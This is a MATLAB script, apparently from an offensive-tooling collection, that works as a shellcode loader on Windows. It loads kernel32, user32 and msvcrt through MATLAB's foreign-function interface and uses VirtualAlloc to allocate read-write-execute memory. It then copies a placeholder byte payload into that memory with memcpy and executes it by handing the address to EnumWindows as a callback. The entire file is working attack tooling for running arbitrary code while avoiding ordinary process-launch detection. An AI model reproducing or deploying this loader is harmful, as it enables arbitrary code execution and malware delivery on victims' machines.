% Wra7h/FlavorTown
% MATLAB version: R2023a
% Tested on Win10 x64

if not(libisloaded('kernel32'))
    loadlibrary('kernel32.dll', @kernel32proto);
end

if not(libisloaded('user32'))
    loadlibrary('user32.dll', @user32proto);
end

if not(libisloaded('msvcrt'))
    loadlibrary('msvcrt.dll', @msvcrtproto);
end

%payloadexample = uint8([86, 72, 137, 230,...]);
payload = uint8([PAYLOAD HERE]);
cbPayload = length(payload);

%VirtualAlloc
allocationType = bitxor(hex2dec('00001000'), hex2dec('00002000'));
protection = hex2dec('00000040');
hAlloc = calllib('kernel32', 'VirtualAlloc', [], cbPayload, allocationType, protection);

%Copy payload to RWX memory region
calllib('msvcrt', 'memcpy', hAlloc, payload, int64(cbPayload));

%Execute
calllib('user32', 'EnumWindows', hAlloc, []);

%Cleanup loaded libraries
if libisloaded('kernel32')
    unloadlibrary('kernel32');
end

if libisloaded('user32')
    unloadlibrary('user32');
end

if libisloaded('msvcrt')
    unloadlibrary('msvcrt');
end

function [fcns, structs, enuminfo] = kernel32proto
    fcns=[]; structs=[]; enuminfo=[]; fcns.alias=[];

    % Prototype for VirtualAlloc
    fcns.name{1} = 'VirtualAlloc';
    fcns.calltype{1} = 'cdecl';
    fcns.LHS{1} = 'int64'; 
    fcns.RHS{1} = {'int64Ptr', 'int64', 'uint32', 'uint32'};
end

function [fcns, structs, enuminfo] = user32proto
    fcns=[]; structs=[]; enuminfo=[]; fcns.alias=[];

    % Prototype for EnumWindows
    fcns.name{1} = 'EnumWindows';
    fcns.calltype{1} = 'cdecl';
    fcns.LHS{1} = 'int'; 
    fcns.RHS{1} = {'int64', 'voidPtr'};
end

function [fcns,structs,enuminfo] = msvcrtproto
    fcns=[]; structs=[]; enuminfo=[]; fcns.alias={};
    fcns.name{1} = 'memcpy';
    fcns.calltype{1} = 'cdecl';
    fcns.LHS{1} = 'voidPtr'; 
    fcns.RHS{1} = {'int64', 'uint8Ptr', 'int64'};
end